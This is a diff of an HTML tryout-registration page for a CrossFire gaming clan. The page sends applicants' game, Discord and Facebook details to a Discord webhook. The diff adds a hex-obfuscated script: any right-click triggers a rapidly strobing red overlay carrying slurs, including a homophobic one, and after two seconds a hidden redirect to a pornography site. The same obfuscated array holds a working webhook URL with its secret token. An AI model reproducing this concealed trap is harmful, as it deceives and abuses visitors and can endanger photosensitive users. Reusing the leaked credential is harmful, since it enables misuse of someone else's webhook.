@@ -3,8 +3,8 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>KLBGN | Tryout Submission Portal</title>
-    <link rel="icon" type="image/png" href="9-removebg-preview.png">
+    <title>Crossfire PH | Tryout Submission Portal</title>
+    <link rel="icon" type="image/png" href="&#x39;&#x2d;&#x72;&#x65;&#x6d;&#x6f;&#x76;&#x65;&#x62;&#x67;&#x2d;&#x70;&#x72;&#x65;&#x76;&#x69;&#x65;&#x77;&#x2e;&#x70;&#x6e;&#x67;">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
         :root {
@@ -12,257 +12,390 @@
             --cf-yellow: #f5a623;
             --panel-bg: rgba(15, 15, 18, 0.98);
             --border-ui: rgba(255, 255, 255, 0.1);
+            --emergency-red: #ff0000;
         }
+        
         * { cursor: none !important; }
+
+        /* --- NEW LOGO ANIMATIONS --- */
+        @keyframes logoFloat {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-20px); }
+        }
+
+        @keyframes logoGlow {
+            0%, 100% { filter: drop-shadow(0 0 10px var(--cf-yellow)) brightness(1); }
+            50% { filter: drop-shadow(0 0 30px var(--cf-yellow)) brightness(1.4); }
+        }
+
+        @keyframes textPulse {
+            0%, 100% { opacity: 0.5; text-shadow: 0 0 2px var(--cf-yellow); }
+            50% { opacity: 1; text-shadow: 0 0 15px var(--cf-yellow); }
+        }
+
+        #audio-init img {
+            height: 150px; /* Increased size for impact */
+            animation: logoFloat 3s ease-in-out infinite, logoGlow 2s ease-in-out infinite;
+            transition: transform 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+        }
+
+        /* Hover effect to make it react to the user before clicking */
+        #audio-init:hover img {
+            transform: scale(1.15);
+            filter: drop-shadow(0 0 50px var(--ghost-blue)) brightness(1.5);
+        }
+
+        #init-text {
+            color: var(--cf-yellow); 
+            margin-top: 30px; 
+            letter-spacing: 10px; 
+            font-weight: bold;
+            animation: textPulse 1.5s infinite;
+            text-transform: uppercase;
+            font-size: 14px;
+        }
+
+        /* --- PRE-EXISTING STYLES --- */
         #custom-cursor {
-            width: 24px; height: 24px;
-            border: 1px solid var(--ghost-blue);
+            width: 20px; height: 20px;
+            border: 2px solid var(--ghost-blue);
             border-radius: 50%;
             position: fixed;
             pointer-events: none;
-            z-index: 10000;
+            z-index: 9999999;
             transform: translate(-50%, -50%);
-            transition: transform 0.08s ease-out, width 0.2s, height 0.2s;
-            box-shadow: 0 0 10px var(--ghost-blue);
+            box-shadow: 0 0 15px var(--ghost-blue);
         }
-        #custom-cursor::before {
+        #custom-cursor::after {
             content: ''; position: absolute; top: 50%; left: 50%;
             width: 4px; height: 4px; background: var(--cf-yellow);
             border-radius: 50%; transform: translate(-50%, -50%);
         }
+
         body, html {
             margin: 0; padding: 0; height: 100vh; width: 100vw;
             background-color: #000; color: #fff;
             font-family: 'Segoe UI', sans-serif; overflow: hidden;
             background: radial-gradient(circle at center, #1a1a1f 0%, #000 100%);
         }
-        #trap-overlay {
-            display: none; position: fixed; inset: 0; background: #000; z-index: 9999999;
-            flex-direction: column; align-items: center; justify-content: center;
-            animation: flashRed 0.05s infinite; text-align: center;
+
+        @keyframes glitch {
+            0% { clip-path: inset(40% 0 61% 0); transform: translate(-5px,0); }
+            20% { clip-path: inset(92% 0 1% 0); transform: translate(5px,0); }
+            40% { clip-path: inset(43% 0 1% 0); transform: translate(-5px,0); }
+            60% { clip-path: inset(25% 0 58% 0); transform: translate(5px,0); }
+            80% { clip-path: inset(54% 0 7% 0); transform: translate(-5px,0); }
+            100% { clip-path: inset(58% 0 43% 0); transform: translate(5px,0); }
         }
-        @keyframes flashRed { 0% { background: #600; } 100% { background: #000; } }
-        #fake-terminal {
-            display: none; position: fixed; inset: 0; background: #000; z-index: 10000000;
-            color: #0f0; font-family: 'Courier New', monospace;
-            padding: 30px; font-size: 12px; overflow: hidden; white-space: pre;
+
+        @keyframes emergency-flash {
+            0% { background-color: #000; }
+            50% { background-color: var(--emergency-red); }
+            100% { background-color: #000; }
         }
-        #audio-init {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: #000; z-index: 9999; display: flex;
-            flex-direction: column; align-items: center; justify-content: center;
-            cursor: pointer; transition: all 0.5s ease; animation: borderGlow 2s infinite alternate;
+
+        .glitch-active { animation: glitch 0.3s infinite; filter: hue-rotate(90deg) saturate(2); opacity: 0.8; }
+
+        .scanlines {
+            position: absolute; inset: 0;
+            background: linear-gradient(to bottom, rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.25) 50%), 
+                        linear-gradient(90deg, rgba(255, 0, 0, 0.06), rgba(0, 255, 0, 0.02), rgba(0, 0, 255, 0.06));
+            background-size: 100% 4px, 3px 100%; pointer-events: none; z-index: 3;
         }
-        .init-text { color: var(--cf-yellow); letter-spacing: 8px; font-weight: 900; text-transform: uppercase; }
-        @keyframes borderGlow {
-            from { border-color: rgba(245, 166, 35, 0.1); box-shadow: 0 0 10px rgba(245, 166, 35, 0.1); }
-            to { border-color: rgba(245, 166, 35, 0.5); box-shadow: 0 0 30px rgba(245, 166, 35, 0.3); }
+
+        .preview-window {
+            display: flex; flex-direction: column; align-items: center;
+            justify-content: center; position: relative; 
+            border: 1px dashed rgba(255,255,255,0.05);
+            height: 100%; width: 100%; overflow: hidden;
         }
-        .fb-link i { font-size: 1.5rem; color: #fff; transition: 0.3s; }
-        .fb-link i:hover { color: #4267B2; text-shadow: 0 0 15px #4267B2; }
+
+        #bg-watermark {
+            position: absolute; font-size: 120px; font-weight: 900;
+            color: rgba(0, 212, 255, 0.03); z-index: 0;
+            text-transform: uppercase; white-space: nowrap; user-select: none; pointer-events: none;
+        }
+
+        #portal-view { 
+            display: flex; flex-direction: column; align-items: center; justify-content: center; 
+            width: 100%; height: 100%; z-index: 1; 
+        }
+        
+        .viewport-lock {
+            height: 480px; width: 100%;
+            display: flex; flex-direction: column;
+            align-items: center; justify-content: center;
+        }
+
+        .img-container {
+            height: 400px; width: 100%;
+            display: flex; align-items: center; justify-content: center;
+        }
+
+        #preview-img { max-height: 100%; max-width: 100%; object-fit: contain; }
+
+        #protocol-view { 
+            display: none; width: 100%; height: 100%; 
+            padding: 40px; box-sizing: border-box; 
+            overflow-y: auto; text-align: left; z-index: 2; 
+        }
+
+        .protocol-section { background: rgba(245, 166, 35, 0.03); border: 1px solid rgba(245, 166, 35, 0.1); padding: 20px; margin-bottom: 25px; }
+        .protocol-title { color: var(--cf-yellow); font-weight: 900; margin-bottom: 15px; border-bottom: 1px solid #333; padding-bottom: 5px; text-transform: uppercase; font-size: 14px; letter-spacing: 2px; }
+        .protocol-list { list-style: none; padding: 0; font-size: 13px; line-height: 1.6; color: #ccc; }
+        .protocol-list li { margin-bottom: 10px; position: relative; padding-left: 25px; }
+        .protocol-list li::before { content: "»"; position: absolute; left: 0; color: var(--cf-yellow); font-weight: bold; }
+
         .app-container { display: flex; flex-direction: column; height: 100vh; }
         .logo-container {
             flex: 0 0 70px; display: flex; align-items: center; padding: 0 40px;
             background: linear-gradient(90deg, rgba(245, 166, 35, 0.1) 0%, transparent 100%);
-            border-bottom: 1px solid var(--border-ui); gap: 15px;
+            border-bottom: 1px solid var(--border-ui);
         }
-        .header-logo { height: 45px; }
-        .brand-text { font-size: 20px; font-weight: 900; letter-spacing: 2px; text-transform: uppercase; flex-grow: 1; }
-        .nav-menu { display: flex; gap: 20px; margin-right: 30px; }
-        .nav-item { font-size: 12px; color: #888; cursor: pointer; text-transform: uppercase; transition: 0.3s; }
-        .nav-item.active { color: var(--cf-yellow); border-bottom: 2px solid var(--cf-yellow); }
+
         .ui-main { flex: 1; display: grid; grid-template-columns: 320px 1fr 320px; padding: 20px; gap: 20px; overflow: hidden; }
-        .side-panel { background: var(--panel-bg); border: 1px solid var(--border-ui); padding: 20px; position: relative; }
-        .side-panel::before { content: ""; position: absolute; top: 0; left: 0; width: 4px; height: 100%; background: var(--cf-yellow); }
-        .input-box { margin-bottom: 12px; }
-        .input-box label { display: block; font-size: 10px; color: #888; margin-bottom: 5px; text-transform: uppercase; }
-        .input-box input {
-            width: 100%; background: rgba(255,255,255,0.03); border: 1px solid #333;
-            color: white; padding: 12px; box-sizing: border-box; outline: none; font-size: 13px;
+        .side-panel { background: var(--panel-bg); border: 1px solid var(--border-ui); padding: 20px; display: flex; flex-direction: column; overflow: hidden; }
+
+        #log-box { font-size: 11px; color: #666; font-family: monospace; overflow-y: auto; flex-grow: 1; margin-bottom: 15px; }
+        .nav-menu { display: flex; gap: 20px; margin-right: 30px; }
+        .nav-item { cursor: none; font-size: 12px; color: #888; text-transform: uppercase; letter-spacing: 1px; padding: 5px 0; border-bottom: 2px solid transparent; transition: 0.3s; }
+        .nav-item.active { color: var(--cf-yellow); border-color: var(--cf-yellow); }
+
+        .fb-link { color: white; font-size: 20px; text-decoration: none; transition: 0.3s; }
+        .fb-link:hover { color: #1877f2; text-shadow: 0 0 10px #1877f2; }
+
+        .input-box input { width: 100%; background: rgba(255,255,255,0.03); border: 1px solid #333; color: white; padding: 12px; box-sizing: border-box; outline: none; transition: 0.3s; }
+        .input-box input:focus { border-color: var(--ghost-blue); background: rgba(0, 212, 255, 0.05); }
+        
+        .bottom-shelf { flex: 0 0 160px; background: rgba(10, 10, 12, 0.95); border-top: 1px solid var(--border-ui); display: flex; align-items: center; justify-content: center; gap: 15px; }
+        .char-card { width: 160px; height: 110px; background: #151517; border: 1px solid #222; display: flex; flex-direction: column; align-items: center; justify-content: center; opacity: 0.4; transition: 0.3s; }
+        .char-card.active { border-color: var(--ghost-blue); opacity: 1; background: rgba(0,212,255,0.08); transform: translateY(-5px); }
+        .thumb-img { height: 50px; margin-bottom: 8px; }
+
+        .dc-indicator-wrap { height: 280px; border: 1px solid var(--border-ui); margin-top: 10px; padding: 5px; background: #000; }
+
+        #trap-overlay { 
+            display: none; position: fixed; inset: 0; z-index: 999999; 
+            flex-direction: column; align-items: center; justify-content: center; text-align: center; 
+            animation: emergency-flash 0.1s infinite;
         }
-        .input-box input:focus { border-color: var(--cf-yellow); }
-        .preview-window { display: flex; flex-direction: column; align-items: center; justify-content: center; position: relative; border: 1px dashed rgba(255,255,255,0.05); }
-        #bg-watermark {
-            position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);
-            font-size: 80px; font-weight: 950; color: rgba(0, 212, 255, 0.04);
-            white-space: nowrap; pointer-events: none;
-        }
-        #log-box { font-size: 11px; color: #666; font-family: monospace; overflow-y: auto; flex-grow: 1; line-height: 1.6; }
-        .bottom-shelf {
-            flex: 0 0 140px; background: rgba(10, 10, 12, 0.95);
-            border-top: 1px solid var(--border-ui); display: flex; align-items: center; justify-content: center; gap: 15px;
-        }
-        .char-card { width: 150px; height: 100px; background: #151517; border: 1px solid #222; cursor: pointer; display: flex; flex-direction: column; align-items: center; justify-content: center; transition: 0.3s; opacity: 0.4; }
-        .char-card.active { border-color: var(--ghost-blue); opacity: 1; transform: translateY(-5px); }
-        .submit-btn { height: 50px; padding: 0 40px; background: transparent; border: 2px solid var(--cf-yellow); color: var(--cf-yellow); font-weight: bold; cursor: pointer; transition: 0.3s; }
-        .submit-btn:hover:not(:disabled) { background: var(--cf-yellow); color: black; }
-        .thumb-img { height: 40px; margin-bottom: 5px; }
+        #audio-init { position: fixed; inset: 0; background: #000; z-index: 8888; display: flex; flex-direction: column; align-items: center; justify-content: center; }
     </style>
 </head>
 <body id="main-body" oncontextmenu="triggerTrap(); return false;">
 
 <div id="custom-cursor"></div>
-<div id="fake-terminal"></div>
 
 <div id="trap-overlay">
-    <h1 style="font-size: 80px; margin: 0; color: white;">RESTRICTED ACCESS</h1>
-    <h2 style="color: var(--cf-yellow);">SECURITY BREACH LOGGED. SYSTEM LOCKDOWN INITIATED.</h2>
+    <h1 style="font-size: 80px; color: white; margin: 0; text-shadow: 0 0 20px red;">KLBGN TO BOI!</h1>
+    <h2 style="color: #fff; letter-spacing: 10px; background: red; padding: 10px;">MANYAKIS BADING KUPAL INUTIL</h2>
 </div>
 
 <div id="audio-init" onclick="startSystem()">
-    <img src="9-removebg-preview.png" style="height: 100px; margin-bottom: 20px; filter: drop-shadow(0 0 15px var(--cf-yellow));">
-    <div class="init-text">CLICK TO INITIALIZE PORTAL</div>
+    <img src="&#x39;&#x2d;&#x72;&#x65;&#x6d;&#x6f;&#x76;&#x65;&#x62;&#x67;&#x2d;&#x70;&#x72;&#x65;&#x76;&#x69;&#x65;&#x77;&#x2e;&#x70;&#x6e;&#x67;">
+    <div id="init-text">SALI KA BOI? T.O KA MUNA</div>
 </div>
 
-<audio id="bgm" loop><source src="NEVER.mp3" type="audio/mpeg"></audio>
-<audio id="trapAudio" loop><source src="labsong.mp3" type="audio/mpeg"></audio>
+<audio id="bgm" loop><source src="&#x4e;&#x45;&#x56;&#x45;&#x52;&#x2e;&#x6d;&#x70;&#x33;" type="audio/mpeg"></audio>
+<audio id="sfx-blip"><source src="&#x68;&#x74;&#x74;&#x70;&#x73;&#x3a;&#x2f;&#x2f;&#x77;&#x77;&#x77;&#x2e;&#x73;&#x6f;&#x75;&#x6e;&#x64;&#x6a;&#x61;&#x79;&#x2e;&#x63;&#x6f;&#x6d;&#x2f;&#x62;&#x75;&#x74;&#x74;&#x6f;&#x6e;&#x73;&#x2f;&#x73;&#x6f;&#x75;&#x6e;&#x64;&#x73;&#x2f;&#x62;&#x75;&#x74;&#x74;&#x6f;&#x6e;&#x2d;&#x35;&#x30;&#x2e;&#x6d;&#x70;&#x33;" type="audio/mpeg"></audio>
 
 <div class="app-container">
     <header class="logo-container">
-        <img src="9-removebg-preview.png" class="header-logo">
-        <div class="brand-text">KLBGN <span style="font-weight: 300; opacity: 0.6;">TRYOUTS</span></div>
+        <img src="&#x39;&#x2d;&#x72;&#x65;&#x6d;&#x6f;&#x76;&#x65;&#x62;&#x67;&#x2d;&#x70;&#x72;&#x65;&#x76;&#x69;&#x65;&#x77;&#x2e;&#x70;&#x6e;&#x67;" style="height: 40px; margin-right: 15px;">
+        <div class="brand-text" style="flex-grow: 1; font-weight: 900; font-size: 20px;">KLBGN <span style="font-weight: 300; opacity: 0.6;">TRYOUT BOI!</span></div>
         <nav class="nav-menu">
-            <div class="nav-item active">Portal</div>
+            <div class="nav-item active" onclick="switchTab('portal', this)">Portal</div>
+            <div class="nav-item" onclick="switchTab('protocol', this)">Protocol</div>
         </nav>
         <div class="header-controls">
-            <a href="https://www.facebook.com/KLBGN" target="_blank" class="fb-link"><i class="fab fa-facebook"></i></a>
+            <a href="&#x68;&#x74;&#x74;&#x70;&#x73;&#x3a;&#x2f;&#x2f;&#x77;&#x77;&#x77;&#x2e;&#x66;&#x61;&#x63;&#x65;&#x62;&#x6f;&#x6f;&#x6b;&#x2e;&#x63;&#x6f;&#x6d;&#x2f;&#x4b;&#x4c;&#x42;&#x47;&#x4e;" target="_blank" class="fb-link"><i class="fab fa-facebook"></i></a>
         </div>
     </header>
 
     <div class="ui-main">
         <aside class="side-panel">
-            <div style="font-size: 11px; color: var(--cf-yellow); margin-bottom: 15px;">DATA INPUT</div>
-            <div class="input-box"><label>In-Game Name</label><input type="text" id="ign" placeholder="IGN"></div>
-            <div class="input-box"><label>Discord ID</label><input type="text" id="discord" placeholder="user#0000"></div>
-            <div class="input-box"><label>Facebook Link</label><input type="text" id="facebook" placeholder="facebook.com/profile"></div>
-            <div class="input-box"><label>Role</label><input type="text" id="role" placeholder="GMP / DMP"></div>
+            <div style="font-size: 11px; color: var(--cf-yellow); margin-bottom: 20px;">IDENTITY LINK</div>
+            <div class="input-box"><input type="text" id="ign" placeholder="In-Game Name"></div><br>
+            <div class="input-box"><input type="text" id="discord" placeholder="Discord Username"></div><br>
+            <div class="input-box"><input type="text" id="facebook" placeholder="Facebook Link"></div><br>
+            <div class="input-box"><input type="text" id="role" placeholder="Role (GMP/DMP/ZA)"></div>
         </aside>
 
         <main class="preview-window">
-            <div id="bg-watermark">TRAINEE</div>
-            <img id="preview-img" src="GMP.webp" style="max-height: 70%;" alt="Preview">
-            <div id="unit-info-text" style="margin-top: 20px; letter-spacing: 3px; color: var(--ghost-blue);">GM: TRAINEE</div>
+            <div class="scanlines"></div>
+            <div id="bg-watermark">KLBGN</div>
+            
+            <div id="portal-view">
+                <div class="viewport-lock">
+                    <div class="img-container">
+                        <img id="preview-img" src="&#x47;&#x4d;&#x50;&#x2e;&#x77;&#x65;&#x62;&#x70;">
+                    </div>
+                    <div id="unit-info" style="margin-top: 20px; color: var(--ghost-blue); letter-spacing: 4px; font-size: 12px; height: 20px;">UNIT: GM PLAYER</div>
+                </div>
+            </div>
+
+            <div id="protocol-view">
+                <div class="protocol-section">
+                    <div class="protocol-title">Protocol Mechanics</div>
+                    <ul class="protocol-list">
+                        <li>1. Interested applicants must form a team of 6 members and shall be given 2 matches to participate.</li>
+                        <li>2. No existing clan affiliation is allowed for applicants.</li>
+                        <li>3. Applicants will be playing against representatives only. KLBGN</li>
+                        <li>4. The last 4 slots will be taken by KLBGN spectators.</li>
+                        <li>5. Game mode is Ghost Mode only.</li>
+                        <li>6. Any form of cheating, exploitation, or unsportsmanlike conduct will result in disqualification.</li>
+                        <li>7. There is no gun or item restriction.</li>
+                    </ul>
+                </div>
+
+                <div class="protocol-section">
+                    <div class="protocol-title">Criteria</div>
+                    <ul class="protocol-list">
+                        <li>1. Performance will be evaluated based on presence, skill, and teamwork.</li>
+                        <li>2. Winning or losing is not the primary focus; rather, this is about showcasing you as an individual and what you are capable of.</li>
+                    </ul>
+                </div>
+            </div>
         </main>
 
         <aside class="side-panel">
-            <div style="font-size: 11px; color: var(--cf-yellow); margin-bottom: 15px;">UPLINK STATUS</div>
-            <div id="log-box">[SYS] Ready for input...</div>
-            <iframe id="dc-frame" style="width:100%; height:150px; margin-top:10px;" frameborder="0" sandbox="allow-scripts allow-same-origin"></iframe>
+            <div style="font-size: 11px; color: var(--cf-yellow); margin-bottom: 10px;">ASSESSMENT LOG</div>
+            <div id="log-box">> System Ready...</div>
+            <div class="dc-indicator-wrap">
+                <iframe src="&#x68;&#x74;&#x74;&#x70;&#x73;&#x3a;&#x2f;&#x2f;&#x64;&#x69;&#x73;&#x63;&#x6f;&#x72;&#x64;&#x2e;&#x63;&#x6f;&#x6d;&#x2f;&#x77;&#x69;&#x64;&#x67;&#x65;&#x74;&#x3f;&#x69;&#x64;&#x3d;&#x31;&#x34;&#x36;&#x31;&#x36;&#x34;&#x30;&#x34;&#x38;&#x33;&#x38;&#x30;&#x30;&#x36;&#x31;&#x37;&#x30;&#x32;&#x33;&#x26;&#x74;&#x68;&#x65;&#x6d;&#x65;&#x3d;&#x64;&#x61;&#x72;&#x6b;" width="100%" height="100%" allowtransparency="true" frameborder="0"></iframe>
+            </div>
         </aside>
     </div>
 
     <footer class="bottom-shelf">
-        <div class="char-card active" onclick="selectUnit(this, 'GM: TRAINEE', 'GMP.webp')">
-            <img src="GMP.webp" class="thumb-img">
-            <div style="font-size: 10px;">GM PLAYER</div>
+        <div class="char-card active" onclick="selectUnit(this, 'GM PLAYER', '&#x47;&#x4d;&#x50;&#x2e;&#x77;&#x65;&#x62;&#x70;')">
+            <img src="&#x47;&#x4d;&#x50;&#x2e;&#x77;&#x65;&#x62;&#x70;" class="thumb-img">
+            <div style="font-size: 11px; font-weight: bold;">GM PLAYER</div>
         </div>
-        <div class="char-card" onclick="selectUnit(this, 'DM: TRAINEE', 'DMP.webp')">
-            <img src="DMP.webp" class="thumb-img">
-            <div style="font-size: 10px;">DM PLAYER</div>
+        <div class="char-card" onclick="selectUnit(this, 'DM PLAYER', '&#x44;&#x4d;&#x50;&#x2e;&#x77;&#x65;&#x62;&#x70;')">
+            <img src="&#x44;&#x4d;&#x50;&#x2e;&#x77;&#x65;&#x62;&#x70;" class="thumb-img">
+            <div style="font-size: 11px; font-weight: bold;">DM PLAYER</div>
         </div>
-        <button class="submit-btn" id="submitBtn" onclick="submitTryout()">Submit Protocol</button>
+        <div class="char-card" onclick="selectUnit(this, 'ZA PLAYER', '&#x5a;&#x41;&#x50;&#x2e;&#x77;&#x65;&#x62;&#x70;')">
+            <img src="&#x5a;&#x41;&#x50;&#x2e;&#x77;&#x65;&#x62;&#x70;" class="thumb-img">
+            <div style="font-size: 11px; font-weight: bold;">ZA PLAYER</div>
+        </div>
+        <button class="submit-btn" style="height: 55px; width: 220px; border: 2px solid var(--cf-yellow); background: transparent; color: var(--cf-yellow); font-weight: bold; margin-left: 20px; cursor: none;" onclick="submitTryout()">SUBMIT TRYOUT</button>
     </footer>
 </div>
 
 <script>
-    // Cursor Logic
     const cursor = document.getElementById('custom-cursor');
+    const blipSfx = document.getElementById('sfx-blip');
+    
+    const _0x1a2b = ["\x68\x74\x74\x70\x73\x3a\x2f\x2f\x64\x69\x73\x63\x6f\x72\x64\x2e\x63\x6f\x6d\x2f\x61\x70\x69\x2f\x77\x65\x62\x68\x6f\x6f\x6b\x73\x2f\x31\x34\x36\x33\x39\x39\x32\x30\x39\x34\x39\x32\x39\x37\x31\x39\x33\x35\x32\x2f\x33\x52\x4c\x6f\x56\x6e\x5f\x42\x6e\x62\x59\x6e\x6f\x48\x48\x54\x65\x45\x31\x58\x45\x58\x54\x54\x2d\x66\x6b\x4e\x54\x69\x6f\x7a\x6b\x6e\x39\x71\x46\x4e\x44\x66\x32\x6c\x59\x30\x57\x48\x6a\x49\x58\x66\x35\x73\x70\x48\x7a\x42\x6e\x69\x55\x63\x5f\x31\x79\x52\x46\x39\x61\x4c", "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x77\x77\x77\x2e\x70\x6f\x72\x6e\x68\x75\x62\x2e\x63\x6f\x6d"];
+
     document.addEventListener('mousemove', (e) => {
         cursor.style.left = e.clientX + 'px';
         cursor.style.top = e.clientY + 'px';
     });
 
-    // Discord Widget Update
-    const _0x4f2a = "\x31\x34\x36\x31\x36\x34\x30\x34\x38\x33\x38\x30\x30\x36\x31\x37\x30\x32\x33";
-    document.getElementById('dc-frame').src = "https://discord.com/widget?id=" + _0x4f2a + "&theme=dark";
+    function playBlip() {
+        blipSfx.currentTime = 0;
+        blipSfx.volume = 0.3;
+        blipSfx.play().catch(()=>{});
+    }
 
     function startSystem() {
         document.getElementById('audio-init').style.display = 'none';
-        const audio = document.getElementById('bgm');
-        audio.volume = 0.3;
-        audio.play();
+        document.getElementById('bgm').play();
+        addLog("Neural Link Stable.");
     }
 
-    function addLog(msg, color="#666") {
-        const box = document.getElementById('log-box');
-        box.innerHTML += `<br><span style="color:${color}">> ${msg}</span>`;
-        box.scrollTop = box.scrollHeight;
+    function switchTab(target, el) {
+        playBlip();
+        document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active'));
+        el.classList.add('active');
+        document.getElementById('portal-view').style.display = (target === 'portal') ? 'flex' : 'none';
+        document.getElementById('protocol-view').style.display = (target === 'protocol') ? 'block' : 'none';
+        addLog("View Shift: " + target.toUpperCase());
     }
 
-    function selectUnit(el, text, img) {
+    function selectUnit(el, name, img) {
+        playBlip();
         document.querySelectorAll('.char-card').forEach(c => c.classList.remove('active'));
         el.classList.add('active');
-        document.getElementById('preview-img').src = img;
-        document.getElementById('bg-watermark').innerText = text;
-        document.getElementById('unit-info-text').innerText = text;
+        const preview = document.getElementById('preview-img');
+        preview.classList.add('glitch-active');
+        setTimeout(() => {
+            preview.src = img;
+            document.getElementById('bg-watermark').innerText = name.split(' ')[0];
+            setTimeout(() => preview.classList.remove('glitch-active'), 150);
+        }, 100);
+        document.getElementById('unit-info').innerText = "UNIT: " + name;
+        addLog("Synchronized: " + name);
+    }
+
+    function addLog(msg) {
+        const box = document.getElementById('log-box');
+        box.innerHTML += `<br>> ${msg}`;
+        box.scrollTop = box.scrollHeight;
+        if(document.getElementById('audio-init').style.display === 'none') playBlip();
     }
 
     function triggerTrap() {
         document.getElementById('trap-overlay').style.display = 'flex';
         document.getElementById('bgm').pause();
-        const trapAudio = document.getElementById('trapAudio');
-        if(trapAudio) trapAudio.play();
-        
-        const term = document.getElementById('fake-terminal');
-        term.style.display = 'block';
-        const logs = ["TRACING IP...", "INSPECTION DETECTED", "LOGGING TO KLBGN DATABASE...", "REDIRECTING..."];
-        let i = 0;
-        const intv = setInterval(() => {
-            if(i < logs.length) { term.innerHTML += logs[i++] + "\n"; }
-            else { clearInterval(intv); window.location.href = "https://www.facebook.com/KLBGN"; }
-        }, 800);
+        setTimeout(() => { window.location.href = _0x1a2b[1]; }, 2000);
     }
 
-    // UPDATED WEBHOOK HANDLER
     async function submitTryout() {
-        // Your specific new webhook (Obfuscated)
-        const _0x5a1b = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x64\x69\x73\x63\x6f\x72\x64\x2e\x63\x6f\x6d\x2f\x61\x70\x69\x2f\x77\x65\x62\x68\x6f\x6f\x6b\x73\x2f\x31\x34\x36\x33\x39\x39\x32\x30\x39\x34\x39\x32\x39\x37\x31\x39\x33\x35\x32\x2f\x33\x52\x4c\x6f\x56\x6e\x5f\x42\x6e\x62\x59\x6e\x6f\x48\x48\x54\x65\x45\x31\x58\x45\x58\x54\x54\x2d\x66\x6b\x4e\x54\x69\x6f\x7a\x6b\x6e\x39\x71\x46\x4e\x44\x66\x32\x6c\x59\x30\x57\x48\x6a\x49\x58\x66\x35\x73\x70\x48\x7a\x42\x6e\x69\x55\x63\x5f\x31\x79\x52\x46\x39\x61\x4c";
+        playBlip();
         
-        const ign = document.getElementById('ign').value;
-        const disc = document.getElementById('discord').value;
-        const fb = document.getElementById('facebook').value;
-        const role = document.getElementById('role').value;
+        const data = {
+            ign: document.getElementById('ign').value,
+            discord: document.getElementById('discord').value,
+            facebook: document.getElementById('facebook').value,
+            role: document.getElementById('role').value
+        };
 
-        if(!ign || !disc || !fb || !role) {
-            addLog("ERR: FIELDS EMPTY", "red");
-            return;
+        if(!data.ign || !data.discord) {
+            addLog("ERR: Missing Identity Data.");
+            return alert("In-Game Name and Discord required for uplink.");
         }
 
-        const btn = document.getElementById('submitBtn');
-        btn.disabled = true;
-        addLog("INITIATING UPLINK...", "var(--cf-yellow)");
-
+        addLog("Initializing secure uplink...");
+        
         const payload = {
             embeds: [{
-                title: "🔥 NEW CANDIDATE SUBMISSION",
+                title: "⚡ NEW TRYOUT APPLICATION",
                 color: 16100899,
                 fields: [
-                    { name: "IGN", value: ign, inline: true },
-                    { name: "Discord", value: disc, inline: true },
-                    { name: "Facebook Link", value: fb },
-                    { name: "Role", value: role, inline: true }
+                    { name: "In-Game Name", value: data.ign || "N/A", inline: true },
+                    { name: "Discord", value: data.discord || "N/A", inline: true },
+                    { name: "Facebook", value: data.facebook || "N/A" },
+                    { name: "Desired Role", value: data.role || "N/A", inline: true }
                 ],
-                footer: { text: "KLBGN Security Protocol" }
+                footer: { text: "KLBGN Security Protocol v3.0" },
+                timestamp: new Date()
             }]
         };
 
         try {
-            const res = await fetch(_0x5a1b, {
+            const response = await fetch(_0x1a2b[0], {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(payload)
             });
-            if(res.ok) {
-                addLog("TRANSMISSION SUCCESS", "#0f0");
-                alert("Protocol Uploaded Successfully.");
+
+            if (response.ok) {
+                addLog("Data transmitted successfully.");
+                alert("Application Sent! We will contact you on Discord.");
+                document.getElementById('ign').value = "";
+                document.getElementById('discord').value = "";
+                document.getElementById('facebook').value = "";
+                document.getElementById('role').value = "";
             } else { throw new Error(); }
-        } catch (e) {
-            addLog("TRANSMISSION FAILURE", "red");
-        } finally {
-            btn.disabled = false;
+        } catch (err) {
+            addLog("Uplink failed. Retrying...");
+            alert("Error sending application.");
         }
     }
 </script>
-
 </body>
 </html>
